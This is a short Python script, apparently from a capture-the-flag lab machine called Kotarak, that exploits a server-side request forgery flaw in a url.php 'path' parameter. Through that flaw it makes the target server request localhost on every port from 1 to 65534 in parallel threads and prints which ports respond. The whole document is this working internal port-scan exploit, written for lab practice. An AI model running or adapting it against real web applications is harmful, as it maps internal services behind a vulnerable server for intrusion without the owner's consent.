#!/usr/bin/python
#coding: utf-8

import requests, threading, sys, signal

def makeRequest(url, port):
	r = requests.get(url)

	if r.text.strip():
		print "El puerto %s esta abierto" % port

def sig_handler(sig, frame):
	print "\n[*] Exiting...\n"
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

if __name__ == '__main__':
	url = "http://10.10.10.10:60000/url.php?path=http://localhost:"
	threads = []

	for port in range(1, 65535):
	    url_port = url + str(port)

    	t = threading.Thread(target=makeRequest, args=(url_port, port))
    	threads.append(t)
    	t.start()

# Maquina Kotarak
